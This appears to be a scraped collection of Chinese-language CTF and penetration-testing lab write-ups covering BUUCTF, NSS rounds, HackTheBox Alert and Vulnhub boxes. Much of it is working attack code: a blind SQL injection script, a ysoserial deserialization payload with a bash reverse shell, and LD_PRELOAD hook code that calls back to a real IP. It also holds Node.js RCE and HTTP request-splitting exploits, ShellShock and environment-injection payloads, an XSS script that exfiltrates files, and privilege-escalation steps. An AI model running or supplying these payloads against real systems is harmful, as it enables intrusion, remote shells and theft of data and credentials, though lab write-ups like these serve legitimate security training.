url=\"http://afe4417f-e94a-484b-bd96-f8a0e17414a5.node4.buuoj.cn:81/comments.php\" url2=\"http://14a849d8-1ab5-4d00-a4d6-62d9671f66b0.node4.buuoj.cn:81/comments.php?name=c\" def SqlBlind(): result=\"\" for i in range(1,1000): left = 32 right = 127 mid=(left+right)//2 while left {})\".format(i,mid), # 'name':\"c\", # 'comment':\"hack\", # 'name':\"0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))>{})\".format(i,mid), # 'name':\"0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='wfy_information')),{},1))>{})\".format(i,mid), 'name':\"0^(ord(substr((select(group_concat(text))from(wfy_comments)where(user='f1ag_is_here')),{},1))>{})\".format(i,mid), } # 请求方式 #r=requests.get(url=url,params=params) r=requests.post(url=url,data=params) #print(r.text) # 防止429 if r.status_code == 429: time.sleep(0.5) #r=requests.get(url=url2) # 编码 #r=str(r.json()) # True的标志 0的个数 if \"好耶\" in r.text: # if r.text.count('0')==i: left = mid+1 else: right = mid mid=(left+right)//2 if left = 127: break result += chr(mid) print(\"[+]\",result) if __name__ == '__main__': SqlBlind() Rome @Controller /* */ public class SerController /* */ { /* */ @GetMapping({\"/\"}) /* */ @ResponseBody /* */ public String helloCTF() { /* 19 */ return \"Do you like Jvav?\"; /* */ } /* */ @PostMapping({\"/\"}) /* */ @ResponseBody /* */ public String helloCTF(@RequestParam String EXP) throws IOException, ClassNotFoundException { /* 24 */ if (EXP.equals(\"\")) { /* 25 */ return \"Do you know Rome Serializer?\"; /* */ } /* 27 */ byte[] exp = Base64.getDecoder().decode(EXP); /* 28 */ ByteArrayInputStream bytes = new ByteArrayInputStream(exp); /* 29 */ ObjectInputStream objectInputStream = new ObjectInputStream(bytes); /* 30 */ objectInputStream.readObject(); /* 31 */ return \"Do You like Jvav?\"; /* */ } /* */ } 反序列化点 objectInputStream.readObject(); ROME反序列化分析 https://www.yulate.com/292.html java版本要jdk8u-121照着文章本地复现了，但是用ysoserial写了反弹shell，题目的发送过去不可以 这周发现只要把payload拿去url编码后就可以了。 这里思考了得出的结果是 RFC3986中指定了以下字符为保留字符：! * ' ( ) ; : @ & = + $ , / ? # [ ] 　　不安全字符：还有一些字符，当他们直接放在URL中的时候，可能会引起解析程序的歧义。这些字符被视为不安全字符，原因有很多。 空格：Url 在传输的过程，或者用户在排版的过程，或者文本处理程序在处理Url的过程，都有可能引入无关紧要的空格，或者将那些有意义的空格给去掉。 引号以及<>：引号和尖括号通常用于在普通文本中起到分隔Url的作用 #：通常用于表示书签或者锚点 %：百分号本身用作对不安全字符进行编码时使用的特殊字符，因此本身需要编码 {}|\\^[]`~：某一些网关或者传输代理会篡改这些字符 而base64加密后可能会出现+,/,= 解题步骤 java -jar ysoserial.jar ROME \"bash -c {echo,xxx}|{base64,-d}|{bash,-i}\" > 1.txt xxx为base64后的bash -i >& /dev/tcp/ip/2333 0>&1 这里> 1.txt是因为如果我加了|base64生成了之后会出现其他符号 用python或者cyberchef来base64加密 exp EXP=对上面生成的base64再进行url编码 连接后flag在根目录 week 5 So Baby RCE Again 直接利用>写入木马，然后一开始使用蚁剑连接 读取根目录下的start.sh #!/bin/bash echo $FLAG > /ffll444aaggg && export FLAG=not && FLAG=not && chmod 700 /ffll444aaggg && \\ service apache2 restart && \\ tail -f /dev/null 这里chmod 700 /ffll444aaggg的意思就是/ffll444aaggg只有root用户可以访问。 然后第一个想到的就是用suid提权，因为之前哪一周的misc是用到了这个知识点。 但是没有想到的是蚁剑的终端太不好用了（其实我之前觉得蚁剑挺强的，因为它自带那些绕过插件） 比如变量赋值没用 查找具有suid的命令没用 反弹shell bash -c 'bash -i >& /dev/tcp/120.77.73.212/2333 0>&1' www-data@out:/$ find / -user root -perm -4000 -print 2>/dev/null find / -user root -perm -4000 -print 2>/dev/null /bin/date /bin/mount /bin/su /bin/umount www-data@out:/$ date -f ffll444aaggg date -f ffll444aaggg date: invalid date 'flag{1f005b40-39e2-4538-8816-3e27bdd98352}' final round 时间盲注 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-22 10:47:42 "},"06.WriteUp/CTF/NodeJs.html":{"url":"06.WriteUp/CTF/NodeJs.html","title":"NodeJs相关","keywords":"","body":"nodejs基础 使用 Node.js 时，我们不仅仅 在实现一个应用，同时还实现了整个 HTTP 服务器。事实上，我们的 Web 应用以及对应的 Web 服务器基本上是一样的。 在我们创建 Node.js 第一个 \"Hello, World!\" 应用前，让我们先了解下 Node.js 应用是由哪几部分组成的： 引入 required 模块：我们可以使用 require 指令来载入 Node.js 模块。 创建服务器：服务器可以监听客户端的请求，类似于 Apache 、Nginx 等 HTTP 服务器。 接收请求与响应请求 服务器很容易创建，客户端可以使用浏览器或终端发送 HTTP 请求，服务器接收请求后返回响应数据。 app.use('static',express.static('public')) # 访问路由/static/，可以访问到public文件夹下的静态文件 引入模块 //require就像import var http = require(\"http\"); 创建服务器 var http = require('http'); http.createServer(function (request, response) { // 发送 HTTP 头部 // HTTP 状态值: 200 : OK // 内容类型: text/plain response.writeHead(200, {'Content-Type': 'text/plain'}); // 发送响应数据 \"Hello World\" response.end('Hello World\\n'); }).listen(8888); // 终端打印如下信息 console.log('Server running at http://127.0.0.1:8888/'); express框架 demo.js var express = require('express'); var app = express(); app.get('/',(req, res) => { res.send('test'); }) var server = app.listen(8081, function () { var host = server.address().address var port = server.address().port console.log(\"应用实例，访问地址为 http://%s:%s\", host, port) }) const wiki = require('./wiki.js'); // ... app.use('/wiki', wiki); wiki.js // wiki.js - 维基路由模块 const express = require('express'); const router = express.Router(); // 主页路由 router.get('/', (req, res) => { res.send('维基主页'); }); // \"关于页面\"路由 router.get('/about', (req, res) => { res.send('关于此维基'); }); module.exports = router; request 和 response 对象的具体介绍： Request 对象 - request 对象表示 HTTP 请求，包含了请求查询字符串，参数，内容，HTTP 头部等属性。常见属性有： req.app：当callback为外部文件时，用req.app访问express的实例 req.baseUrl：获取路由当前安装的URL路径 req.body / req.cookies：获得「请求主体」/ Cookies req.fresh / req.stale：判断请求是否还「新鲜」 req.hostname / req.ip：获取主机名和IP地址 req.originalUrl：获取原始请求URL req.params：获取路由的parameters req.path：获取请求路径 req.protocol：获取协议类型 req.query：获取URL的查询参数串 req.route：获取当前匹配的路由 req.subdomains：获取子域名 req.accepts()：检查可接受的请求的文档类型 req.acceptsCharsets / req.acceptsEncodings / req.acceptsLanguages：返回指定字符集的第一个可接受字符编码 req.get()：获取指定的HTTP请求头 req.is()：判断请求头Content-Type的MIME类型 Response 对象 - response 对象表示 HTTP 响应，即在接收到请求时向客户端发送的 HTTP 响应数据。常见属性有： res.app：同req.app一样 res.append()：追加指定HTTP头 res.set()在res.append()后将重置之前设置的头 res.cookie(name，value [，option])：设置Cookie opition: domain / expires / httpOnly / maxAge / path / secure / signed res.clearCookie()：清除Cookie res.download()：传送指定路径的文件 res.get()：返回指定的HTTP头 res.json()：传送JSON响应 res.jsonp()：传送JSONP响应 res.location()：只设置响应的Location HTTP头，不设置状态码或者close response res.redirect()：设置响应的Location HTTP头，并且设置状态码302 res.render(view,[locals],callback)：渲染一个view，同时向callback传递渲染后的字符串，如果在渲染过程中有错误发生next(err)将会被自动调用。callback将会被传入一个可能发生的错误以及渲染后的页面，这样就不会自动输出了。 res.send()：传送HTTP响应 res.sendFile(path [，options] [，fn])：传送指定路径的文件 -会自动根据文件extension设定Content-Type res.set()：设置HTTP头，传入object可以一次设置多个头 res.status()：设置HTTP状态码 res.type()：设置Content-Type的MIME类型 原型链污染 前置知识 https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html 每个构造函数（js中构造函数即是类）都有一个原型对象(prototype) 对象的__proto__属性，指向类的原型对象prototype JavaScript使用prototype链实现继承机制 类.prototype == 对象.__proto__ 这两者指向的是同一个对象 漏洞成因 数组（对象）的\"键名\"能够被操作，能够修改对象的__proto__属性。 let o2 = {a: 1, \"__proto__\": {b: 2}} 上述中__proto__不是o2的键名，是因为\"__proto__\": {b: 2}实际上是修改了原型对象的属性b,所以o2的键名为a和b。 而在json的解析下，会将\"__proto__\"认为是键名 常见操作 对象merge 对象clone（其实内核就是将待操作的对象merge到一个空对象中） set-value 实例 var express = require('express') var app = express(); let o1 = {}; o3 = {}; function merge(target, source) { for (let key in source) { if (key in source && key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } } } function judge(){ if(o3.b==2) return \"success\"; else return \"false\"; } app.get('/',express.json(),(req,res)=>{ // var id =req.query.id; let o2 = JSON.parse(req.query.id) merge(o1, o2); res.send(judge()); }) var server = app.listen(8081, function () { var host = server.address().address var port = server.address().port console.log(\"应用实例，访问地址为 http://%s:%s\", host, port) }) sodirty 关键代码 const Admin = { \"password\":process.env.password?process.env.password:\"password\" } router.post(\"/getflag\", function (req, res, next) { if (req.body.password === undefined || req.body.password === req.session.challenger.password){ res.send(\"登录失败\"); }else{ if(req.session.challenger.age > 79){ res.send(\"糟老头子坏滴很\"); } let key = req.body.key.toString(); let password = req.body.password.toString(); if(Admin[key] === password){ res.send(process.env.flag ? process.env.flag : \"flag{test}\"); }else { res.send(\"密码错误，请使用管理员用户名登录.\"); } } }); if (req.body.attrkey === undefined || req.body.attrval === undefined) { res.send(\"传参有误\"); }else { let key = req.body.attrkey.toString(); let value = req.body.attrval.toString(); setFn(req.session.challenger, key, value); res.send(\"修改成功\"); } 需要让下面代码成立 Admin[key] === req.session.challenger.password req.session.challenger的键名是可控的，所以只需要污染req的原型对象属性值就可以污染Admin payload # 使得原型对象具有pwd属性值 attrkey=__proto__.pwd&value=18 # /update # 因为Admin对象没有pwd属性，就会从原型对象寻找 key=pwd&password=18 # /getflag Ez_Express 漏洞点 存在原型链污染（clone）和ssti（render） router.post('/action', function (req, res) { if(req.session.user.user!=\"ADMIN\"){res.end(\"alert('ADMIN is asked');history.go(-1);\")} req.session.user.data = clone(req.body); res.end(\"alert('success');history.go(-1);\"); }); const clone = (a) => { return merge({}, a); } const merge = (a, b) => { for (var attr in b) { if (isObject(a[attr]) && isObject(b[attr])) { merge(a[attr], b[attr]); } else { a[attr] = b[attr]; } } return a } router.get('/info', function (req, res) { res.render('index',data={'user':res.outputFunctionName}); }) 需要先绕过ADMIN登录 if(safeKeyword(req.body.userid)){ res.end(\"alert('forbid word');history.go(-1);\") } req.session.user={ 'user':req.body.userid.toUpperCase(), 'passwd': req.body.pwd, 'isLogin':false } res.redirect('/'); function safeKeyword(keyword) { if(keyword.match(/(admin)/is)) { return keyword } return undefined } Fuzz中的javascript大小写特性 | 离别歌 \"ı\".toUpperCase() == 'I' \"ſ\".toUpperCase() == 'S' \"K\".toLowerCase() == 'k' RCE global.process.mainModule.constructor._load(‘child_process’).exec('command') require( \"child_process\" ).spawnSync( 'command', ['arg'] ).stdout.toString() require( \"child_process\" ).spawnSync( 'command', ['arg'] ).stdout.toString() require(\"child_process\").execSync('command') require(\"child_process\").execSync('command') CRLF NodeJS 中 Unicode 字符损坏导致的 HTTP 拆分攻击-安全客 - 安全资讯平台 import urllib.parse import requests payload = ''' HTTP/1.1 POST /file_upload HTTP/1.1 Host: 127.0.0.1:8081 Content-Length: 298 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: 127.0.0.1:8081 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjgcOqgAmbNWkjnvS User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: 127.0.0.1:8081/?action=upload Accept-Encoding: gzip, deflate Accept-Language: zh,zh-CN;q=0.9 Connection: close ------WebKitFormBoundaryjgcOqgAmbNWkjnvS Content-Disposition: form-data; name=\"file\"; filename=\"1.pug\" Content-Type: ../template var x = eval(\"glob\"+\"al.proce\"+\"ss.mainMo\"+\"dule.re\"+\"quire('child_'+'pro'+'cess')['ex'+'ecSync']('ls /').toString()\") ------WebKitFormBoundaryjgcOqgAmbNWkjnvS-- GET / HTTP/1.1 test:'''.replace(\"\\n\", \"\\r\\n\") def payload_encode(raw): ret = u\"\" for i in raw: ret += chr(0x0100+ord(i)) return ret payload = payload_encode(payload) pro = {'http': 'http://127.0.0.1:8011', 'https': 'http://127.0.0.1:8011' } r = requests.get('http://77cb6778-efc8-49b4-9567-fdf189136b3a.node4.buuoj.cn:81/core?q=' + urllib.parse.quote(payload),proxies=pro, verify=False) 中间部分是伪造的请求，需要注意content-length，直接放在burp中发包，burp会自动更新content-length Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-11-11 16:23:18 "},"06.WriteUp/CTF/NSSRound5.html":{"url":"06.WriteUp/CTF/NSSRound5.html","title":"NSS Round 5","keywords":"","body":"[NSSRound#V Team]PYRCE from flask import Flask, request, make_response import uuid import os # flag in /flag app = Flask(__name__) def waf(rce): black_list = '01233456789un/|{}*!;@#\\n`~\\'\\\"> 思路一，用/flag覆盖app.py文件，再访问/source路由 这里覆盖完了之后，还可以访问路由的原因是debug=False，所以即使覆盖了app.py文件，但是flask运行所使用的文件并没有受到影响。 而如果debug=True，当我们修改文件时，flask就会自动重载文件。 此时覆盖flask运行文件（我本地是pyrce.py） 控制台 访问/source路由 思路二，利用可以访问静态文件，先创建static目录（flask框架结构，静态文件放在static目录下），再将flag复制到static目录，访问/static/flag就能够下载flag文件。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 23:09:58 "},"06.WriteUp/CTF/NSSRound6.html":{"url":"06.WriteUp/CTF/NSSRound6.html","title":"NSS Round 6","keywords":"","body":"[NSSRound#6 Team]check V1--任意文件上传 服务端对上传的压缩包进行解压操作，并且没有对压缩包内容进行检查，导致可以通过符号链接达到任意覆盖/上传文件的效果。 例子 假设我们要覆盖/home/khaz/shell目录下的1.sh文件 那么我们首先可以先创建一个软链接指向这个目录，并将其打包成压缩包1。 然后我们需要再创建一个与软链接名字相同的目录，并在这个目录下创建要覆盖的文件。然后将该目录打包为压缩包2。 然后解压压缩包1，得到test，然后解压压缩包2，其中test/clean.sh，因为当前目录下test是指向/home/khaz/shell的，所以实际上会将clean.sh解压到/home/khaz/shell下从而覆盖原来的clean.sh。 try: tar = tarfile.open(file_save_path, \"r\") tar.extractall(app.config['UPLOAD_FOLDER']) @app.route('/clean', methods=['POST']) def clean_file(): os.system('/tmp/clean.sh') return 'success' if __name__ == '__main__': app.run(host='0.0.0.0', debug=True, port=80) 做的时候，发现反弹shell不生效，在本地测试后发现是因为没有给clean.sh权限，所以覆盖后就不能执行了。 ps：这里还有一个思路就是既然可以任意上传/覆盖文件，那么可以直接覆盖app.py文件。 ​ 这是因为每次修改工作目录下的文件，flask都会自动重载文件。 V2--任意文件下载 服务端对上传的压缩包进行解压操作，并且没有对压缩包内容进行检查，并提供下载功能。导致解压出来的文件如果是符号链接文件就可以下载任意文件。 @app.route('/download', methods=['POST']) def download_file(): filename = request.form.get('filename') if filename is None or filename == '': return '?' filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename) if '..' in filename or '/' in filename: return '?' if not os.path.exists(filepath) or not os.path.isfile(filepath): return '?' with open(filepath, 'r') as f: return f.read() @app.route('/clean', methods=['POST']) def clean_file(): os.system('su ctf -c /tmp/clean.sh') return 'success' if __name__ == '__main__': app.run(host='0.0.0.0', debug=True, port=80) 与v1相比不同点在于su ctf -c /tmp/clean.sh限制了用户权限，但是flask还是以root权限启动的，所以下载功能还是root权限。 构造符号链接指向/flag，利用下载功能就能够读取到flag import requests url = \"http://43.142.108.3:28187/download\" params = { \"filename\": \"test2\" } res = requests.post(url=url,data=params).text print(res) Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 23:09:17 "},"06.WriteUp/CTF/环境变量注入.html":{"url":"06.WriteUp/CTF/环境变量注入.html","title":"环境变量注入","keywords":"","body":"概念 LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。 具体的操作步骤如下： 定义与目标函数完全一样的函数，包括名称、变量及类型、返回值及类型等。 将包含替换函数的源码编译为动态链接库。 通过命令 export LD_PRELOAD=\"库文件路径\"，设置要优先替换动态链接库即可。 替换结束，要还原函数调用关系，用命令unset LD_PRELOAD 解除 例子 劫持ls命令 查找ls命令执行时调用的系统函数，例如调用了strncmp payload #include #include #include void payload() { system(\"id\"); } int strncmp(const char *__s1, const char *__s2, size_t __n) { if (getenv(\"LD_PRELOAD\") == NULL) { return 0; } unsetenv(\"LD_PRELOAD\"); payload(); } 这里函数的定义可以根据报错信息进行确定 从源码中找到的 编译形成.so文件 gcc -shared -fPIC hook_strncmp.c -o hook_strncmp.so 环境变量设置优先级 export LD_PRELOAD=$PWD/hook_strncmp.so 执行命令结果 更为简单的劫持 GCC 有个 C 语言扩展修饰符 attribute((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在动态链接库中，那么一旦动态链接库被系统加载，将立即执行 _attribute((constructor)) 修饰的函数。这样，我们就不用局限于仅劫持某一函数，而应考虑劫持动态链接库了，也可以说是劫持了一个新进程。 hook.c #include #include #include __attribute__ ((__constructor__)) void preload (void){ unsetenv(\"LD_PRELOAD\"); system(\"bash -c 'bash -i >& /dev/tcp/120.77.73.212/2333 0>&1'\"); //system(\"echo \\\"\\\" > /var/www/html/shell.php\"); } 编译形成.so文件 gcc -shared -fPIC hook.c -o hook.so PHP中 RCE 绕过disable_function 条件 能够上传文件，只要是.so文件，任意后缀名都可以解析 能够设置环境变量LD_PRELOAD 有可以启动新进程的 PHP 函数（这样才能够劫持） 如何找到可以启动新进程的 PHP 函数 查看PHP函数调用时的shell操作 strace -f php test.php 2>&1 | grep -A2 -B2 execve test.php s 可以看到执行mail函数时实际是启动了一个新的进程来调用系统命令sendmail 其他可以启动新进程的php函数 error_log(\"\", 1, \"\", \"\"); $img = new Imagick('/tmp/a5edb30f575fb2f877a19b2f62a2e720/whoami.wmv'); system imap_mail() mb_send_mail() 文件上传绕过disable_function https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD 无上传文件操作--ShellShock（CVE-2014-6271） 以下测试环境 $val) { putenv(\"{$key}={$val}\"); } //... 一些其他代码 system('echo hello'); # 相当于sh -c echo \"command\" ?> payload 只适用于redhat系列--centos redhat系列sh指向bash debian系列指向dash Bash没有修复ShellShock漏洞：直接使用ShellShock的POC进行测试，例如TEST='() { :; }'; id; Bash 4.4以前：env $'BASH_FUNC_echo()=() { id; }' bash -c \"echo hello\" Bash 4.4及以上：env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello' 本地测试 # system('echo hello'); # 相当于sh -c echo \"command\" ?envs[BASH_FUNC_echo()]=() { ls; } 其他情况下的环境变量注入payload redhat PROMPT_COMMAND：可以在bash交互式环境下执行任意命令 PROMPT_COMMAND='id' bash 通用 ENV：可以在sh -i -c的时候注入任意命令 ENV='$(id 1>&2)' sh -i -c \"echo hello\" BASH_ENV：可以在bash -c的时候注入任意命令 BASH_ENV='$(id 1>&2)' bash -c 'echo hello' PS1：可以在dash或bash交互式环境下执行任意命令 PS1='$(whoami)' dash/bash 复现 system('command') ----> php_exec_ex() ----> php_exec() ---> linux popen函数 ---> Linux glibc库 ----> sh -c echo \"command\" glibc是gnu发布的libc库，也即c运行库。glibc是linux 系统中最底层的api（应用程序开发接口），几乎其它任何的运行库都会倚赖于glibc。 debian系列 sh -c echo \"command\" --> dash -c echo \"command\" # 在debian系列sh指向dash 漏洞产生原因 在dash源码中 if ( #ifndef linux getuid( ) == geteuid( ) && getgid( ) == getegid( ) S & #endif iflag ）{ // iflag为-i参数，所以只有传入-i参数才能进入下面的if语句 if ((shinit = lookupvar(\"ENV\")) != NULL && *shinit != '\\0') { read_profile(shinit); } } read_profile STATIC void read_profile(const char *name) { // expandstr可以解析shell命令，解析的name参数就是环境变量ENV name = expandstr(name); if (setinputfile(name, INPUT_PUSH_FILE | INPUT_NOFILE_OK) payload ENV='$(id 1>&2)' dash -i -c 'echo hello' 参考文章 https://www.anquanke.com/post/id/254388#h3-6 https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:05:44 "},"06.WriteUp/靶机/HackTheBox--Alert.html":{"url":"06.WriteUp/靶机/HackTheBox--Alert.html","title":"Hack The Box Alert","keywords":"","body":" 知识点 信息收集 Self-XSS利用 漏洞利用--盲打数据外带 密码破解 配置不当权限提升 端口转发（可选） 相关信息 靶机：Alert Linux · Easy IP：10.10.11.44 VPS：10.10.16.2 本地虚拟机：10.8.0.2 端口扫描 Web渗透 md上传预览功能 白名单文件上传只能上传.md文件，存在XSS [a](javascript:alert(window.location)) 但是self-xss没有危害，不过这里右下角有一个share功能，如果可以分享给管理员那么就可以进行攻击 联系功能 POC测试 那么先拿一个poc测试，md内容 将该文件的分享链接发送给管理员 可以看到靶机发送的请求，证明可以使用XSS来进行攻击 读取文件 fetch(\"http://alert.htb/messages.php?file=../../../../../../../filepath\") .then(response => response.text()) .then(data => { fetch(\"http://10.10.16.2:8888/?file_content=\" + btoa(data)); }); 注意外带数据最好要进行编码，防止不合法字符 Payload filepath=/proc/self/cmdline /usr/sbin/apache2.-k.start. 获得了服务器的中间件为apache filepath=/etc/apache2/sites-enabled/000-default.conf # Apache 服务器的默认虚拟主机配置文件，通常是 Apache 安装时自动创建的 Options Indexes FollowSymLinks MultiViews AllowOverride All AuthType Basic AuthName \"Restricted Area\" AuthUserFile /var/www/statistics.alert.htb/.htpasswd Require valid-user 获得了敏感信息AuthUserFile /var/www/statistics.alert.htb/.htpasswd（.htpasswd用于存储 Apache Web 服务器的用户认证密码） filepath=/var/www/statistics.alert.htb/.htpasswd albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/ 获得了用户密码密文 密码爆破 hashcat.exe -m 1600 -a 0 \"D:\\Note\\pass.txt\" \"D:\\Global\\apps\\wordlists\\kali-master\\rockyou.txt\" 主机渗透 信息收集 root权限的php web服务 配置错误，monitors目录属于root，但是其他用户具有写权限，可以通过向该目录写入恶意PHP文件进行提权 提升权限 这里要注意的是监听的本地8080端口，而php脚本文件需要访问一次才能解析执行，所以需要curl这个文件，还有一种方法是进行端口转发 ssh -CfNg -L 8080:127.0.0.1:8080 albert@10.10.11.44 # 通过albert@10.10.11.44将127.0.0.1:8080端口转发到本地8080端口 参考SSH 端口转发教程 | 三点水 (lotabout.me) Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-06 15:53:30 "},"06.WriteUp/靶机/Vulnhub-blue系列.html":{"url":"06.WriteUp/靶机/Vulnhub-blue系列.html","title":"Vulnhub--blue系列","keywords":"","body":"1 secret.zip没有破解出来。 dirseach目录扫描结果 访问robots.txt中的网址 歌词连在一起MD5为ssh密码，没成功。 另一个网站为/etc/dripispowerful.html，猜测有文件包含，根据上面的目录扫描只有一个index.php，参数尝试压缩包里的focus on \"drip\"。 尝试访问index.php?drip=/etc/dripispowerful.html，获得密码和两个用户名 ssh登录 提权（不会，看wp的） polkit提权https://github.com/Almorabea/Polkit-exploit 2 ftp匿名登录 wordpress用户爆破，后台getshell ssh密钥登录 nmap提权 ftp存在匿名登录，经过验证发现ftp上的secret.jpg无隐写。 wpscan用户枚举 进行密码爆破 访问后台时跳转，添加host记录 进入后台 在主题的404文件中加入一句话木马，访问该404文件，传入反弹shell 进入家目录看看 无权限，尝试提权失败 但是还存在ssh密钥，我们可以将ssh私钥下载到本地，通过ssh登录到freddie用户 使用python在.ssh目录下开一个简易服务器供本地下载文件。 本地下载下来后，需要将id_rsa改为只有400权限才可以使用 读取/root/root.txt获得第二个flag· 3 ssh日志包含getshell ssh密钥登录 命令劫持提权 几个网站都是ABAB。。 wp-admin目录只有一个readme 恶作剧😡 回头看namp的默认脚本的扫描，可以看到robots.txt中禁止了一个/eventadmins，访问 再访问提示ctrl+a发现 再访问 一开始想的是用九头蛇进行爆破，但是用户只知道root。 后面发现不行，想到日志的用途，尝试进行ssh日志包含getshell。 因为日志中会记录ssh连接的用户名 所以 反弹shell 这里和上一个靶机一样，存在另一个用户robertj，并且www-data无法提权 按照上一个的思路查看.ssh目录，发现为空 选择直接生成ssh密钥 查看ssh配置文件：只允许密钥验证方式连接，并且用来验证的公钥为authorized_keys 所以需要将公钥id_rsa.pub改为authorized_keys 然后用python在靶机上开一个http服务器，kali使用wget命令下载私钥，并修改私钥权限，最后ssh登录 提权 一开始想用strings查看的，但是没有安装，那就直接用一下看看 可以知道这个命令实质上是执行了 ip address cat /etc/hosts uname -a 那么我们选一个进行构造即可 echo \"/bin/bash\" > uname chmod 777 uname export PATH=/home/robertj:$PATH 然后执行getinfo即可 4 misc获得人员信息 ftp爆破 ftp+sync服务，导致可以通过ftp服务器操作网站服务器目录 ssh密钥登录 命令劫持提权 网站注释解码，访问另一个网站，brainfuck解码，二维码扫描最后得到如下 收集到了网站技术人员的名字，可以尝试爆破ftp和ssh服务。 luther gary hubert clark ssh无果 ftp login: luther password: mypics 发现了一个目录，目录名为hubert是收集到的一个用户，并且uid和gid为1001，证明其是第一个用户，所以该目录为hubert用户的家目录。 另一个文件使用get命令下载到本地后 可以发现是一个同步完成的日志。 所以根据这两个信息，我们可以知道服务器会同步这个ftp上的文件，就相当于我们可以操作hubert用户的家目录。 我们使用put命令上传自己的公钥 需要注意公钥名 然后ssh连接 看下家目录有啥 读取这个root权限的py文件，我们可以知道这个网站被黑客frica攻击了，并且留下了后门，所以这也是为什么前面叫人来修复网站的原因🤣 这个黑客还告诉我们他留下了松散的权限😍 让我康康 这次有strings命令，查看getinfo 跟上一个靶机一样 5 wpscan用户枚举 abuzerkomurcu collins gill collins satanic 密码字典生成 -m 6 是因为wordpress密码最少6个字符 爆破密码 gill / interchangeable 普通用户，后台只找到一张可以图片DB 分析这张图片 得到ssh账号 gill 59583hello 登陆后发现 lost+found目录无权限 家目录下有一个kEYFILE 通过搜索得到 可以使用john进行破解，机子GPU太垃圾了，直接从wp拿到密码 获得密码后，可以用KeePass软件https://sourceforge.net/projects/keepass/打开，也可以用在线网站 https://app.keeweb.info/打开。 打开后发现6个空白的key 不知道拿来干嘛的。。 继续信息收集，发现根目录下有一个keyfolder，可能就是要让上面的key放在这个keyfolder 而且使用pyps64监控进程发现有一个定时任务key.sh，每一分钟执行一次。 经测试当只有一个文件fracturedocean时 定时脚本内容 6 只开放了80端口 提示我们目录扫描要添加zip类型，说明网站目录应该存在zip文件 目录扫描 dirserach gobuster 访问/spammer下载得到spammer.zip 使用john爆破 解压得到 mayer:lionheart 访问网站 尝试登录解压得到的用户，成功登录 逛了一圈发现，页面编辑，邮箱泄露，插件（无法加载作罢）。 网站配置 Textpattern version: 4.8.3 (596bca03a4b32004412499363cecec62) Last update: 2020-09-13 19:56:06 Site URL: 192.168.2.35/textpattern Admin URL: 192.168.2.35/textpattern/textpattern Document root: /var/www $path_to_site: /var/www/textpattern Textpattern path: /var/www/textpattern/textpattern Article URL pattern: messy Production status: testing Temporary directory path: /tmp PHP version: 5.5.38-1~dotdeb+7.1 GD Graphics Library: Unavailable Server timezone: UTC Server local time: 2023-03-07 14:40:29 Daylight Saving Time enabled?: 0 Automatically adjust Daylight Saving Time setting?: 1 Time zone (GMT offset in seconds): Asia/Baghdad (10800) MySQL: 5.5.47-0+deb7u1 ((Debian)) Database server time: 2023-03-07 08:40:29 Database server time offset: 0 s Database server timezone: SYSTEM Database session timezone: SYSTEM Locale: C Site / Admin language: en / en Web server: Apache/2.2.22 (Debian) Apache version: Apache/2.2.22 (Debian) PHP server API: apache2handler RFC 2616 headers: Server OS: Linux 3.2.0-4-amd64 Admin-side theme: hive 4.8.3 Pre-flight check: ------------------------ New Textpattern version 4.8.8 available for download. Help DNS lookup failed: 192.168.2.35 Help /var/www/textpattern/textpattern/setup/ still exists. Help Site URL preference might be incorrect: 192.168.174.159/textpattern Help Image directory is not writable: /var/www/textpattern/images Theme directory is not writable: /var/www/textpattern/themes Plugin directory is not writable: /var/www/textpattern/textpattern/plugins Help ------------------------ .htaccess file contents: ------------------------ # BEGIN Textpattern #DirectoryIndex index.php index.html RewriteEngine On # Enable the `FollowSymLinks` option below if it isn't already. #Options +FollowSymlinks #RewriteBase /relative/web/path/ RewriteCond %{REQUEST_FILENAME} -f [OR] RewriteCond %{REQUEST_FILENAME} -d RewriteRule ^(.+) - [PT,L] RewriteCond %{REQUEST_URI} !=/favicon.ico RewriteRule ^(.*) index.php RewriteCond %{HTTP:Authorization} !^$ RewriteRule .* - [E=REMOTE_USER:%{HTTP:Authorization}] AddType image/svg+xml svg svgz AddEncoding gzip svgz # For additional Apache-compatible web server configuration settings to enhance # site performance and security, we recommend: # https://github.com/h5bp/server-configs-apache/blob/master/dist/.htaccess # END Textpattern ------------------------ 文件上传 可以直接上传🐎，无任何防护 漏洞分析：https://blog.csdn.net/yun2diao/article/details/92765372 反弹shell 提权 上传linepeas.sh查找可提权项 这里查找CVE 选择一个cve进行提权，我这里选择的是脏牛提权https://github.com/firefart/dirtycow 7 开放了很多端口和服务，不同端口上都有网站，所以目录扫描时需要注意扫哪个端口 66 80 8086 80端口 msf一条龙 